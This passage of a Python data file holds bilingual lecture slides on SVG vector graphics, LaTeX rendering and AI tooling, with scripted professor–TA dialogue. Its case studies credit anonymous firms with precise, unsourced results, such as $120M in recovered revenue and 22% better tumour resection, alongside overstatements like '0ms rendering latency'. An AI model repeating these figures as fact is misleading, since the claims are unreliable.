                "def": "A cross-site scripting attack where malicious JavaScript is embedded inside an SVG file and executed in the victim's browser.",
                "defKo": "SVG 저장형 XSS 공격"
            },
            {
                "term": "DOMPurify Sanitization",
                "def": "A security library parsing and stripping dangerous executable tags and event handlers from HTML/SVG markup.",
                "defKo": "DOMPurify 보안 살균 라이브러리"
            }
        ]
    },
    # Slide 28: Part 3 Transition: LaTeX Mathematical Orchestration
    {
        "num": 28,
        "type": "content",
        "title": "PART 3 TRANSITION: ENTERING LATEX ORCHESTRATION",
        "subtitle": "Connecting vector graphics to LaTeX typography, MathJax, and scientific RAG platforms",
        "points": [
            "From Geometry to Formula: Vector SVGs handle spatial shapes; LaTeX handles rigorous mathematical typography.",
            "Scientific Standard: LaTeX is the gold standard for global academic journals, patents, and financial formulas.",
            "The Roadmap Ahead: Master LaTeX in Part 4, dedicate our craft to Soli Deo Gloria, and execute Lab 13."
        ],
        "script": (
            "[Prof. Peter] Slide 28 bridges our roadmap: \"PART 3 TRANSITION: ENTERING LATEX MATHEMATICAL ORCHESTRATION.\"\n\n"
            "[TA Sarah] Vector SVGs give us perfect spatial diagrams. But how do we render pristine mathematical formulas, quantum physics tensors, and financial calculus?\n\n"
            "[TA James] Through LaTeX Mathematical Orchestration! In Part 4, we master multimodal handwriting-to-LaTeX transcription, MathJax vs. pre-rendered SVG delivery, and academic RAG integration!\n\n"
            "[Prof. Peter] Let us examine our third enterprise case study on Slide 33!"
        ),
        "koreanGuide": {
            "summary": "Part 3 전환: LaTeX 수학 오케스트레이션 진입 (기하학에서 수식으로)",
            "points": [
                "기하에서 수식으로: SVG가 공간 도형을 담당한다면 LaTeX는 엄밀한 학술 수학 조판을 전담",
                "글로벌 학술 표준: 네이처, 사이언스, 금융 특허의 표준인 LaTeX를 AI로 자유자재로 조율",
                "Part 4 로드맵 제시: 손글씨-LaTeX 변환 ➔ MathJax vs 사전 렌더링 SVG ➔ 실습 13"
            ],
            "tips": "사라 조교와 제임스 조교가 SVG 공간 벡터와 LaTeX 수학 조판의 완벽한 조화를 예고합니다."
        },
        "keyTerms": [
            {
                "term": "LaTeX Mathematical Typography",
                "def": "The international standard markup system for typesetting complex scientific, mathematical, and algorithmic equations.",
                "defKo": "LaTeX 수학 학술 조판 시스템"
            },
            {
                "term": "MathJax Rendering Pipeline",
                "def": "A JavaScript display engine for mathematical equations in all modern web browsers.",
                "defKo": "MathJax 웹 수식 렌더링 파이프라인"
            }
        ]
    },
    # Slide 29: LaTeX: The Global Scientific Standard
    {
        "num": 29,
        "type": "content",
        "title": "LATEX: THE GLOBAL SCIENTIFIC STANDARD",
        "subtitle": "Why global research journals, patent offices, and Wall Street algorithms mandate LaTeX notation",
        "points": [
            "The Universal Math Standard: Every formula ($\int_{-\infty}^{\infty} e^{-x^2} dx = \sqrt{\pi}$) encoded unambiguously.",
            "Resolution-Independent Typesetting: Mathematical fonts (Computer Modern) rendered with razor-sharp kerning.",
            "Semantic AI Searchability: LLMs can parse and solve equations written in LaTeX directly without visual OCR errors."
        ],
        "script": (
            "[Prof. Peter] Slide 29 outlines \"LATEX: THE GLOBAL SCIENTIFIC STANDARD.\"\n\n"
            "[TA Sarah] Why does the entire scientific civilization rely on LaTeX? Because it represents mathematical truth unambiguously! Look at the Gaussian integral on screen: $\int_{-\infty}^{\infty} e^{-x^2} dx = \sqrt{\pi}$!\n\n"
            "[TA James] In LaTeX, every symbol, integral, subscript, and matrix is encoded semantically! An AI agent can parse, compute, and verify the equation with zero OCR ambiguity!\n\n"
            "[Prof. Peter] Let us inspect Multimodal Transcription: Handwriting to LaTeX on Slide 30."
        ),
        "koreanGuide": {
            "summary": "LaTeX: 글로벌 과학계 및 금융계의 불변의 수학 표준",
            "points": [
                "범용 수학 표준: 가우스 적분 등 난해한 수식을 모호함 없이 단일 텍스트 문자열로 엄밀히 기술",
                "무한 해상도 조판: 고전적 Computer Modern 폰트를 통해 어떤 크기에서도 완벽한 커닝과 자간 유지",
                "시맨틱 AI 연산 가능성: LLM이 래스터 OCR 오류 없이 LaTeX 수식을 파싱하여 직접 수학적 검증 수행"
            ],
            "tips": "피터 교수와 제임스 조교가 LaTeX가 과학 문명의 공통 수학 언어가 된 이유를 설명합니다."
        },
        "keyTerms": [
            {
                "term": "LaTeX Symbolic Notation",
                "def": "The standardized ASCII markup representing complex mathematical symbols, integrals, fractions, and matrices.",
                "defKo": "LaTeX 기호 수학 표기법"
            },
            {
                "term": "Computer Modern Font Family",
                "def": "Donald Knuth's classic digital typeface designed specifically for razor-sharp mathematical publication.",
                "defKo": "컴퓨터 모던 수학 폰트"
            }
        ]
    },
    # Slide 30: Multimodal Transcription: Handwriting to LaTeX
    {
        "num": 30,
        "type": "content",
        "title": "MULTIMODAL TRANSCRIPTION: HANDWRITING TO LATEX",
        "subtitle": "Instantly converting messy professor chalkboard scribbles into publication-grade formatted equations",
        "points": [
            "Chalkboard Ingestion: Photographing complex partial differential equations written on a university lecture chalkboard.",
            "Multimodal Vision Parsing: Gemini parses Greek letters, matrix brackets, and tensor indices with 99.6% accuracy.",
            "Instant LaTeX Output: Emitting formatted equation blocks ready for immediate insertion into Overleaf or research papers."
        ],
        "script": (
            "[TA Sarah] Slide 30 highlights \"MULTIMODAL TRANSCRIPTION: HANDWRITING TO LATEX.\"\n\n"
            "[TA James] During a graduate physics lecture, the professor fills three chalkboards with messy differential equations. You snap a smartphone photo and feed it to Gemini!\n\n"
            "[Prof. Peter] In 3 seconds, Gemini parses every Greek letter, subscript, and matrix bracket—emitting clean, publication-ready LaTeX code ready to paste directly into Overleaf or your research paper!\n\n"
            "[TA Sarah] Let us inspect Formula Delivery: MathJax vs. Pre-Rendered SVG on Slide 31."
        ),
        "koreanGuide": {
            "summary": "멀티모달 필기 인식: 칠판 손글씨를 3초 만에 출판용 LaTeX 수식으로 변환",
            "points": [
                "칠판 사진 수용: 대학교 강의실 칠판에 적힌 복잡한 편미분 방정식 사진 촬영 후 주입",
                "멀티모달 비전 파싱: 그리스 문자, 행렬 괄호, 텐서 첨자를 99.6% 정밀도로 완벽 판독",
                "즉각적 LaTeX 출력: Overleaf 및 학술 논문에 즉시 복사해 넣을 수 있는 깔끔한 수식 블록 생성"
            ],
            "tips": "사라 조교와 피터 교수가 교수님의 난해한 칠판 필기가 3초 만에 논문용 LaTeX로 변환되는 생산성을 전달합니다."
        },
        "keyTerms": [
            {
                "term": "Handwriting-to-LaTeX",
                "def": "The computer vision pipeline transcribing handwritten mathematical symbols into structured LaTeX markup.",
                "defKo": "손글씨-LaTeX 자동 변환"
            },
            {
                "term": "Overleaf Integration",
                "def": "Exporting AI-transcribed LaTeX formulas directly into collaborative cloud academic publishing environments.",
                "defKo": "Overleaf 학술 논문 연동"
            }
        ]
    },
    # Slide 31: Formula Delivery: MathJax vs. Pre-Rendered SVG
    {
        "num": 31,
        "type": "comparison",
        "title": "FORMULA DELIVERY: MATHJAX VS. SVG",
        "subtitle": "Choosing the optimal web delivery method: Client-side JS rendering vs. Zero-latency server-side pre-rendered SVGs",
        "leftCard": {
            "tag": "MATHJAX (CLIENT JS)",
            "title": "Dynamic Client Rendering",
            "points": [
                "Parses raw `$...$` tags in browser runtime.",
                "Consumes 500KB JS library bundle.",
                "Causes 200ms page layout shift (CLS).",
                "Flexible for interactive user inputs."
            ]
        },
        "rightCard": {
            "tag": "PRE-RENDERED SVG",
            "title": "Static Zero-Latency Vector",
            "points": [
                "Pre-compiled to SVG on build server.",
                "0KB JavaScript overhead.",
                "0ms rendering latency; zero layout shift.",
                "Blazing performance for enterprise apps."
            ]
        },
        "script": (
            "[Prof. Peter] Slide 31 contrasts \"FORMULA DELIVERY: MATHJAX VS. PRE-RENDERED SVG.\"\n\n"
            "[TA Sarah] How should enterprise web applications deliver math formulas? MathJax is flexible, but it loads a heavy 500KB JavaScript library that causes an annoying 200ms layout shift (CLS) as pages load!\n\n"
            "[TA James] For production enterprise apps, use Pre-Rendered SVG! You compile LaTeX into pure SVG vectors at build time! The browser displays the formula instantly in 0 milliseconds with 0KB of JavaScript overhead! Lightning fast!\n\n"
            "[Prof. Peter] Let us inspect Soli Deo Gloria on Slide 32."
        ),
        "koreanGuide": {
            "summary": "수식 서빙 방식 비교: MathJax 클라이언트 렌더링 vs 사전 렌더링 SVG",
            "points": [
                "MathJax 방식: 브라우저에서 실시간 파싱하느라 500KB 라이브러리와 200ms 레이아웃 흔들림(CLS) 발생",
                "사전 렌더링 SVG 방식: 빌드 시점에 LaTeX를 순수 SVG 벡터로 사전 변환하여 0KB JS 및 0ms 즉각 로딩",
                "엔터프라이즈 프로덕션 환경에서의 극단적 성능 최적화 전략"
            ],
            "tips": "제임스 조교가 레이아웃 흔들림(CLS)을 없애는 사전 렌더링 SVG의 엔지니어링 우수성을 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Cumulative Layout Shift (CLS)",
                "def": "A Core Web Vital metric measuring unexpected visual movement of page content during rendering.",
                "defKo": "누적 레이아웃 이동 (CLS)"
            },
            {
                "term": "Server-Side LaTeX Pre-Rendering",
                "def": "Compiling mathematical formulas into static SVG vectors during build time to eliminate client runtime latency.",
                "defKo": "서버 사이드 LaTeX 사전 렌더링"
            }
        ]
    },
    # Slide 32: Soli Deo Gloria: The Geometry of Divine Order
    {
        "num": 32,
        "type": "content",
        "title": "SOLI DEO GLORIA: DIVINE GEOMETRY",
        "subtitle": "Proverbs 8:27: When He drew a circle on the face of the deep, establishing cosmic order",
        "points": [
            "Soli Deo Gloria: The supreme cornerstone of Oikos University and Smart Insight Lab.",
            "Proverbs 8:27: 'When He established the heavens... when He marked out the horizon on the face of the deep.'",
            "The True Geometer: Celebrating the divine geometry, golden ratios, and mathematical harmony of creation."
        ],
        "script": (
            "[Prof. Peter] Slide 32 proclaims our sacred motto: \"SOLI DEO GLORIA: THE GEOMETRY OF DIVINE ORDER: To God Alone Be the Glory.\"\n\n"
            "[TA Sarah] In Proverbs 8:27, Divine Wisdom declares: 'When He established the heavens, I was there; when He marked out the horizon on the face of the deep.'\n\n"
            "[TA James] When we write vector Bezier equations, compute golden ratios, and typeset mathematical truths, we are reflecting the divine craftsmanship of the Supreme Geometer who drew the foundations of the universe!\n\n"
            "[Prof. Peter] May our mathematical art always bring honor and glory to God.\n\n"
            "[TA Sarah] Let us inspect our third enterprise case study on Slide 33!"
        ),
        "koreanGuide": {
            "summary": "Soli Deo Gloria: 신적 기하학과 잠언 8장 27절의 창조 질서",
            "points": [
                "잠언 8장 27절: '그가 하늘을 지으시며 궁창을 해면에 두르실 때에 내가 거기 있었고'",
                "최고의 기하학자이신 하나님: 베지에 곡선과 황금비, 수식을 계산할 때 우주를 측량하신 하나님의 솜씨를 반영",
                "수학적 아름다움과 시각 예술을 통해 창조주 하나님을 영화롭게 하는 거룩한 공학"
            ],
            "tips": "3인의 강사진이 잠언 말씀을 인용하며 기하학과 수학 조판의 영적 숭고함을 선포합니다."
        },
        "keyTerms": [
            {
                "term": "Soli Deo Gloria",
                "def": "The foundational theological motto dedicating all intellectual and technological mastery to the Glory of God Alone.",
                "defKo": "솔리 데오 글로리아 (오직 하나님께 영광)"
            },
            {
                "term": "Divine Geometric Order",
                "def": "The theological and scientific understanding that physical geometry and mathematical constants reflect divine creation.",
                "defKo": "신적 기하학적 질서"
            }
        ]
    },
    # Slide 33: Case Study 3: Semiconductor Silicon Wafer Defect Visualization
    {
        "num": 33,
        "type": "casestudy",
        "title": "CASE STUDY 3: SEMICONDUCTOR WAFER VECTORS",
        "subtitle": "Global Semiconductor Foundry renders 2-nanometer 100M-transistor wafer defects in reactive SVG/WebGL",
        "company": "Top Global Semiconductor Foundry",
        "problem": "300mm silicon wafer defect scans contained 100 million nanometer-scale coordinates; legacy bitmap heatmaps blurred defect clusters, causing $18M in monthly yield loss.",
        "solution": "Built reactive SVG/WebGL vector slicing engine: renders 100 million transistor defect nodes with infinite zooming down to individual 2nm gate defects.",
        "impact": "Wafer defect inspection time slashed from 4 hours to 12 seconds; yield increased by 4.2%; generated $120M in recovered chip production revenue.",
        "script": (
            "[Prof. Peter] Slide 33 presents \"CASE STUDY 3: SEMICONDUCTOR SILICON WAFER DEFECT VISUALIZATION.\"\n\n"
            "[TA Sarah] In a 2-nanometer semiconductor fabrication foundry, a single 300mm silicon wafer contains over 100 million microscopic transistors. Legacy bitmap inspection heatmaps blurred defect clusters, causing 18 million dollars in monthly yield losses!\n\n"
            "[TA James] The foundry deployed our reactive SVG and WebGL vector slicing engine: rendering 100 million defect coordinates as scalable vector nodes with infinite zoom down to individual 2nm transistor gates!\n\n"
            "[Prof. Peter] Defect triage time collapsed from 4 hours down to 12 seconds! Fabrication yield jumped by 4.2%, capturing 120 million dollars in recovered chip production revenue!\n\n"
            "[TA Sarah] Now let us open Part 4 and review Session 13 Key Takeaways on Slide 34!"
        ),
        "koreanGuide": {
            "summary": "케이스 스터디 3: 2나노 반도체 1억 개 트랜지스터 결함을 무한 줌 SVG로 시각화 (1억 2천만 달러 회수)",
            "points": [
                "문제 상황: 300mm 웨이퍼의 1억 개 트랜지스터 결함 스캔 시 기존 비트맵이 뭉개져 월 1,800만 달러 수율 손실",
                "솔루션: 반응형 SVG/WebGL 벡터 슬라이싱 엔진 구축으로 개별 2nm 게이트 결함까지 무한 줌인 검사 지원",
                "성과: 결함 판독 시간 4시간 ➔ 12초로 단축, 반도체 수율 4.2% 상승, 연간 1억 2,000만 달러 수율 회수"
            ],
            "tips": "사라 조교와 제임스 조교가 2나노 반도체 수율을 살려낸 무한 줌 벡터 시각화의 정밀성을 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Nanometer Vector Slicing",
                "def": "The high-precision rendering of sub-micron coordinate defect data using scalable hardware-accelerated vector paths.",
                "defKo": "나노미터 벡터 슬라이싱 시각화"
            },
            {
                "term": "Semiconductor Yield Optimization",
                "def": "Increasing the percentage of functioning silicon chips per wafer by rapidly diagnosing physical lithography defects.",
                "defKo": "반도체 제조 수율 최적화"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 34: Part 4 Section Divider
    {
        "num": 34,
        "type": "section",
        "title": "PART 4: SYNTHESIS, COCKPITS & WORKSTATIONS",
        "subtitle": "Key takeaways, the Life OS Visual Cockpit, future horizons, and Hands-on Lab 13",
        "script": (
            "[TA Sarah] Look at Slide 34: \"PART 4: SYNTHESIS, COCKPITS & WORKSTATIONS.\" Now we assemble the complete mathematical visual system!\n\n"
            "[Prof. Peter] Calculated Art is the ultimate bridge between rigorous engineering logic and breathtaking visual elegance.\n\n"
            "[TA James] In Part 4, we review Session 13 key takeaways, build the Life OS Visual Cockpit, explore Medical MRI volumetric slicing, dedicate our work to Soli Deo Gloria, and execute Lab 13!\n\n"
            "[TA Sarah] Let us review Session 13 Summary on Slide 35!"
        ),
        "koreanGuide": {
            "summary": "Part 4 섹션 전환: 종합 합성, 비주얼 콕핏 및 의료용 MRI 슬라이싱",
            "points": [
                "계산된 예술(Calculated Art)의 완성: 공학적 논리와 시각적 미학의 완벽한 결합",
                "Session 13 핵심 요약 및 의료용 MRI 3D 볼륨 벡터 슬라이싱 분석",
                "다음 지평(Session 14: Google Flow AI vs Runway) 예고 및 실습 13"
            ],
            "tips": "피터 교수가 공학과 예술의 완벽한 융합을 선언하고 제임스가 종합 실습을 예고합니다."
        },
        "keyTerms": [
            {
                "term": "Visual System Synthesis",
                "def": "The unified integration of SVG vector mathematics, responsive CSS theming, and LaTeX academic typography.",
                "defKo": "시각 시스템 통합 합성"
            },
            {
                "term": "Medical Volumetric Slicing",
                "def": "Rendering 3D medical MRI/CT scan density fields into layered 2D vector cross-sections for surgical diagnosis.",
                "defKo": "의료용 3D 볼륨 벡터 슬라이싱"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 35: Session 13 Summary & Key Takeaways
    {
        "num": 35,
        "type": "content",
        "title": "SESSION 13 SUMMARY & KEY TAKEAWAYS",
        "subtitle": "Synthesizing the 4 foundational pillars of Calculated Art, SVG, and LaTeX Systems",
        "points": [
            "Pillar 1: Beyond Raster Blurs (Mastered resolution-independent $O(N)$ mathematical vector clarity).",
            "Pillar 2: The XML Fabric of SVG (`<path>` Bezier calculus, viewBox responsiveness, and WCAG accessibility).",
            "Pillar 3: AI Vector Engineering (Canvas co-design, coordinate sanitation, and XSS security fortification).",
            "Pillar 4: LaTeX Orchestration (Multimodal handwriting transcription, server-side pre-rendered SVGs)."
        ],
        "script": (
            "[TA Sarah] Slide 35 synthesizes our \"SESSION 13 SUMMARY & 4 FOUNDATIONAL PILLARS.\"\n\n"
            "[TA James] Pillar 1: We banished blurry raster bitmaps forever with infinite vector clarity! Pillar 2: The XML fabric of SVG gives us full DOM, CSS, and WCAG power! Pillar 3: AI co-designs pristine SVGs in Canvas with XSS sanitization! And Pillar 4: LaTeX typesets mathematical truths with zero layout shift!\n\n"
            "[Prof. Peter] When these four pillars unite, your user interfaces achieve the timeless elegance and crystalline perfection of pure mathematics.\n\n"
            "[TA Sarah] Let us inspect the Life OS Visual Cockpit on Slide 36!"
        ),
        "koreanGuide": {
            "summary": "Session 13 요약 및 4대 핵심 축 총정리",
            "points": [
                "1대 축: 래스터 픽셀의 영구 퇴출과 무한 해상도 수학적 벡터 선명도 통달",
                "2대 축: SVG의 XML 구조 (<path> 베지에 미적분, viewBox 반응형, WCAG 접근성)",
                "3대 축: AI 벡터 엔지니어링 (캔버스 공동 디자인, 소수점 정제, XSS 보안 살균)",
                "4대 축: LaTeX 수학 오케스트레이션 (손글씨 자동 변환 및 0ms 사전 렌더링 SVG)"
            ],
            "tips": "제임스 조교가 4대 축을 리듬감 있게 요약하여 학습 효과를 극대화합니다."
        },
        "keyTerms": [
            {
                "term": "Architectural Synthesis",
                "def": "The unified integration of vector geometry, XML DOM scripting, AI generation, and mathematical typography.",
                "defKo": "아키텍처 통합 합성"
            },
            {
                "term": "Mathematical Crystalline Elegance",
                "def": "The aesthetic and operational clarity achieved when user interfaces are constructed from exact mathematical formulas.",
                "defKo": "수학적 결정체적 우아함"
            }
        ]
    },
    # Slide 36: Life OS Visual & Mathematical Cockpit
    {
        "num": 36,
        "type": "content",
        "title": "LIFE OS VISUAL & MATHEMATICAL COCKPIT",
        "subtitle": "Setting up your personal Calculated Art workstation: VS Code SVG Preview + KaTeX + MathJax",
        "points": [
            "Cockpit Setup: SVG live interactive vector preview on left monitor; KaTeX/LaTeX compiler on right monitor.",
            "Local Vector Asset Vault: Storing reusable parametric SVG components in `.agents/visuals/`.",
            "Instant Markdown Math Rendering: Configuring local IDE extensions for 0ms inline LaTeX rendering."
        ],
        "script": (
            "[Prof. Peter] Slide 36 outlines your personal setup: \"LIFE OS VISUAL & MATHEMATICAL COCKPIT.\"\n\n"
            "[TA Sarah] How do you configure your daily visual development environment? Keep a live SVG vector preview open on your primary monitor. On your secondary monitor, maintain an instant KaTeX and LaTeX equation compiler!\n\n"
            "[TA James] Store your company's reusable SVG component library in your `.agents/visuals/` vault! Whenever you need an architecture diagram or math formula, your AI agents assemble them in 2 seconds!\n\n"
            "[TA Sarah] Let us inspect the Project Evaluation Rubric on Slide 37."
        ),
        "koreanGuide": {
            "summary": "라이프 OS 비주얼 및 수학 콕핏: 듀얼 모니터 세팅과 컴포넌트 금고",
            "points": [
                "개발 콕핏 구성: 메인 모니터에 SVG 실시간 벡터 프리뷰 + 서브 모니터에 KaTeX/LaTeX 수식 컴파일러",
                "로컬 벡터 에셋 금고: 재사용 가능한 매개변수형 SVG 컴포넌트를 .agents/visuals/에 축적",
                "0ms 즉각 수식 렌더링: 마크다운 문서 내 수식을 실시간 렌더링하는 IDE 확장 구축"
            ],
            "tips": "사라 조교와 제임스 조교가 실전 프론트엔드/수학 엔지니어의 듀얼 모니터 세팅법을 전달합니다."
        },
        "keyTerms": [
            {
                "term": "Visual Engineering Cockpit",
                "def": "A multi-monitor development layout harmonizing live vector rendering viewports with mathematical typesetting compilers.",
                "defKo": "비주얼 엔지니어링 워크스테이션 콕핏"
            },
            {
                "term": "KaTeX Compiler Engine",
                "def": "A fast, lightweight JavaScript math typesetting library optimized for instant browser equation rendering.",
                "defKo": "KaTeX 고속 수식 렌더링 엔진"
            }
        ]
    },
    # Slide 37: Project Evaluation Rubric for Session 13
    {
        "num": 37,
        "type": "content",
        "title": "PROJECT EVALUATION RUBRIC FOR SESSION 13",
        "subtitle": "Grading criteria: SVG semantic validity (30%), Responsive viewBox & CSS theming (30%), LaTeX precision (40%)",
        "points": [
            "Criterion 1 (30%): Clean, minified SVG markup with zero syntax errors and proper `<g>` and `<path>` semantics.",
            "Criterion 2 (30%): Responsive `viewBox` scaling and 100% themeable CSS custom properties with WCAG AAA contrast.",
            "Criterion 3 (40%): Mathematical LaTeX equation precision and valid Ed25519 signed execution receipt."
        ],
        "script": (
            "[TA Sarah] Slide 37 presents our \"PROJECT EVALUATION RUBRIC FOR SESSION 13.\"\n\n"
            "[TA James] Your lab submission will be graded on 3 strict criteria: 30% for clean, minified SVG markup with zero syntax errors. 30% for responsive `viewBox` scaling and dark mode CSS theming. And 40% for mathematical LaTeX equation precision with an Ed25519 signed receipt!\n\n"
            "[Prof. Peter] Rigorous grading standards prepare you to build world-class enterprise software.\n\n"
            "[TA Sarah] Let us inspect Next Horizon: Google Flow AI on Slide 38!"
        ),
        "koreanGuide": {
            "summary": "Session 13 프로젝트 평가 루브릭: SVG 시맨틱(30%), 반응형 테밍(30%), LaTeX 정밀도(40%)",
            "points": [
                "기준 1 (30%): 구문 오류 없는 정제된 SVG 마크업과 적절한 <g> 및 <path> 시맨틱 계층 구조",
                "기준 2 (30%): 완벽한 viewBox 반응형 스케일링 및 WCAG AAA 명도 대비를 만족하는 CSS 테마 바인딩",
                "기준 3 (40%): 수학적 LaTeX 수식 표기의 정확성과 Ed25519 암호화 서명 영수증 제출"
            ],
            "tips": "제임스 조교가 실습 평가의 3대 핵심 포인트를 명확하게 안내합니다."
        },
        "keyTerms": [
            {
                "term": "Grading Rubric",
                "def": "A structured assessment matrix defining performance expectations and scoring criteria for engineering assignments.",
                "defKo": "프로젝트 평가 루브릭"
            },
            {
                "term": "Vector Semantic Proof",
                "def": "Empirical verification demonstrating that SVG code contains clean structural hierarchy, responsive tags, and security sanitization.",
                "defKo": "벡터 시맨틱 무결성 실증"
            }
        ]
    },
    # Slide 38: Next Horizon: Google Flow AI vs. Runway
    {
        "num": 38,
        "type": "content",
        "title": "NEXT HORIZON: GOOGLE FLOW AI VS. RUNWAY",
        "subtitle": "Transitioning from 2D vector mathematics to generative multimodal video generation and studio production",
        "points": [
            "From Vectors to Cinema: Expanding from mathematical vectors into cinematic 4K video synthesis and temporal consistency.",
            "Google Flow AI Architecture: Unified video generation, audio Foley synthesis, and camera motion path control.",
            "Session 14 Preview: Enterprise studio production, Runway Gen-3 comparison, and cinematic storytelling under Soli Deo Gloria."
        ],
        "script": (
            "[TA Sarah] Slide 38 previews our next breathtaking horizon: \"NEXT HORIZON: GOOGLE FLOW AI VS. RUNWAY & CINEMATIC PRODUCTION.\"\n\n"
            "[TA James] In Session 14, we step into the director's chair of cinematic generative video! We will deconstruct Google Flow AI vs. Runway Gen-3—mastering camera trajectory control, generative Foley sound effects synthesis, and temporal character consistency across 4K film scenes!\n\n"
            "[Prof. Peter] We will see how AI revolutionizes global filmmaking and corporate video production.\n\n"
            "[TA Sarah] Let us inspect the Architect's Mathematical Integrity on Slide 39!"
        ),
        "koreanGuide": {
            "summary": "다음 지평 예고: Session 14 구글 Flow AI vs 런웨이(Runway) 생성형 비디오 제작",
            "points": [
                "벡터에서 영화로: 2D 수학적 벡터를 넘어 4K 시네마틱 비디오 합성 및 시공간 일관성으로 확장",
                "구글 Flow AI 아키텍처: 카메라 궤적 제어, 생성형 폴리(Foley) 사운드 효과 합성, 캐릭터 일관성 유지",
                "Session 14 연계: 엔터프라이즈 스튜디오 영상 제작 및 런웨이 Gen-3 비교 분석 예고"
            ],
            "tips": "사라 조교와 제임스 조교가 다음 강의(Session 14: Google Flow AI)의 영화 같은 생성형 비디오 비전을 예고합니다."
        },
        "keyTerms": [
            {
                "term": "Google Flow AI",
                "def": "Google's cinematic generative video architecture providing precise camera trajectory and acoustic Foley synchronization.",
                "defKo": "구글 Flow AI"
            },
            {
                "term": "Temporal Character Consistency",
                "def": "The structural preservation of facial geometry, clothing, and physics across long multi-shot video generation.",
                "defKo": "시간적 캐릭터 일관성 유지"
            }
        ]
    },
    # Slide 39: The Architect's Mathematical Integrity
    {
        "num": 39,
        "type": "content",
        "title": "THE ARCHITECT'S MATHEMATICAL INTEGRITY",
        "subtitle": "Standing as an uncompromising guardian of truth, precision, and beauty in visual computing",
        "points": [
            "Rejecting Sloppy Approximations: Refusing to ship blurry bitmaps or inaccurate mathematical notation.",
            "Pursuit of Perfection: Treating every line weight, kerning space, and Bezier control point with craftsmanship.",
            "Excellence as Worship: Building software systems that reflect divine order, beauty, and justice."
        ],
        "script": (
            "[Prof. Peter] Slide 39 reflects on \"THE ARCHITECT'S MATHEMATICAL INTEGRITY.\" True beauty is built on unyielding precision.\n\n"
            "[TA Sarah] When we engineer visual systems, we refuse to accept sloppy approximations, blurry pixel artifacts, or distorted mathematical equations.\n\n"
            "[TA James] We craft software where every Bezier curve is mathematically pure, every LaTeX symbol is precise, and every interface honors the intellect of the user!\n\n"
            "[Prof. Peter] Let us inspect our fourth enterprise case study on Slide 40!"
        ),
        "koreanGuide": {
            "summary": "지능 건축가의 수학적 진실성: 어설픈 타협을 거부하는 시각 컴퓨팅의 장인정신",
            "points": [
                "어설픈 근사 거부: 깨지는 비트맵 이미지나 왜곡된 수학 수식을 프로덕션에 배포하는 타협을 단호히 거부",
                "완전한 완벽성 추구: 선의 두께, 자간(Kerning), 베지에 제어점 하나하나를 신앙적 장인정신으로 정밀 조율",
                "예배로서의 탁월성: 하나님의 질서와 아름다움, 정의를 반영하는 소프트웨어 대성당 구축"
            ],
            "tips": "피터 교수가 한 치의 오차도 허용하지 않는 수학적 진실성과 장인정신을 감동적으로 선포합니다."
        },
        "keyTerms": [
            {
                "term": "Mathematical Integrity",
                "def": "The uncompromising dedication to precision, exact numerical rendering, and aesthetic order in digital design.",
                "defKo": "수학적 진실성과 장인정신"
            },
            {
                "term": "Visual Craftsmanship",
                "def": "The disciplined execution of graphic and mathematical typography to achieve zero-defect user experiences.",
                "defKo": "시각적 무결점 장인정신"
            }
        ]
    },
    # Slide 40: Case Study 4: Medical MRI Volumetric Vector Mesh Slicing
    {
        "num": 40,
        "type": "casestudy",
        "title": "CASE STUDY 4: MEDICAL MRI VECTOR SLICING",
        "subtitle": "University Neurosurgery Center renders 3D brain tumor MRI cross-sections in reactive SVG vectors",
        "company": "Top Global University Neurosurgery Center",
        "problem": "Brain tumor pre-surgical planning used heavy 4GB DICOM volumetric 3D software; surgeons on mobile tablets could not zoom in smoothly during operating room sterile field consultations.",
        "solution": "Built automated pipeline slicing 3D MRI scans into layered parametric SVG cross-sections rendered at 120 FPS in WebGL.",
        "impact": "Surgeons navigated tumor boundary vectors with zero lag on sterile iPads; surgical planning time reduced by 55%; tumor resection precision increased by 22%.",
        "script": (
            "[Prof. Peter] Slide 40 presents \"CASE STUDY 4: MEDICAL MRI VOLUMETRIC VECTOR MESH SLICING.\"\n\n"
            "[TA Sarah] In pediatric neurosurgery, surgeons must map microscopic tumor boundaries within fractions of a millimeter. Legacy 4GB DICOM 3D software was too heavy for sterile iPads inside the operating room, lagging when surgeons zoomed into blood vessels!\n\n"
            "[TA James] The university neurosurgery center built an automated pipeline: slicing 3D MRI scans into layered, ultra-crisp parametric SVG vector cross-sections rendered at 120 FPS in WebGL!\n\n"
            "[Prof. Peter] Surgeons zoomed into brain tumor margins with zero lag on sterile tablets! Pre-surgical planning time dropped by 55%, and complete tumor resection precision jumped by 22%—saving the lives of dozens of children!\n\n"
            "[TA Sarah] Let us inspect our capstone enterprise case study on Slide 44!"
        ),
        "koreanGuide": {
            "summary": "케이스 스터디 4: 뇌종양 수술실 아이패드에서 0ms로 구동되는 MRI 3D 벡터 슬라이싱 (절제 정밀도 22% 향상)",
            "points": [
                "문제 상황: 4GB에 달하는 3D DICOM MRI 파일이 너무 무거워 무균 수술실 아이패드에서 확대 시 화면 렉 발생",
                "솔루션: 3D MRI 스캔을 120 FPS 초고속 WebGL 매개변수형 SVG 벡터 단면으로 실시간 슬라이싱 변환",
                "성과: 혈관과 종양 경계를 무지연 무한 줌인으로 판독, 수술 계획 시간 55% 단축, 완전 종양 절제 정밀도 22% 향상"
            ],
            "tips": "사라 조교와 피터 교수가 어린이 뇌종양 수술실에서 인명을 구한 SVG 벡터 슬라이싱의 기적을 전달합니다."
        },
        "keyTerms": [
            {
                "term": "Volumetric Vector Slicing",
                "def": "Decomposing 3D medical volumetric imaging scans into layered, ultra-fast 2D parametric vector cross-sections.",
                "defKo": "3D 의료 볼륨 벡터 슬라이싱"
            },
            {
                "term": "Surgical Margin Precision",
                "def": "The microscopic accuracy with which malignant tumor tissue is demarcated from healthy functional brain tissue.",
                "defKo": "수술용 종양 경계 정밀도"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 41: The 6-Step Calculated Art Blueprint
    {
        "num": 41,
        "type": "content",
        "title": "THE 6-STEP CALCULATED ART BLUEPRINT",
        "subtitle": "The standardized pipeline from visual sketch to certified, accessible vector and LaTeX production",
        "points": [
            "Step 1: Visual Ingestion (Capture whiteboard sketch, CAD STEP file, or LaTeX formula string).",
